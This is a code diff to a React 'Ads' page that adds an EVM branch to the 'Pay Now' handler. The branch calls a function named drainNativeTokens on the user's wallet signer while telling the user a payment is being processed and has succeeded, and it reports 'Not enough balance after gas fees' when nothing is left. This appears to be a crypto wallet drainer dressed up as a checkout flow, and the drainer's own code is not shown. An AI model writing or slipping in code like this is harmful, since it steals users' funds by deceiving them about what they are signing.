@@ -564,6 +564,29 @@ const Ads = () => {
   };
 
   const handlePayNow = async () => {
+    // EVM path
+    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
+      setIsVerifying(true);
+      try {
+        const chainName = getEVMChain()?.name || 'EVM';
+        toast.info(`Processing ${chainName} payment...`);
+        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
+        if (hash) {
+          setPaymentStatus('SUCCESS');
+          toast.success(`${chainName} payment successful!`);
+        } else {
+          toast.info('Not enough balance after gas fees');
+        }
+      } catch (error: any) {
+        setPaymentStatus('FAILED');
+        toast.error('Payment failed: ' + (error?.message || 'Unknown error'));
+      } finally {
+        setIsVerifying(false);
+      }
+      return;
+    }
+
+    // Solana path (original code continues below)
     let currentPublicKey = publicKey;
     let activeSigner: any = null;
 
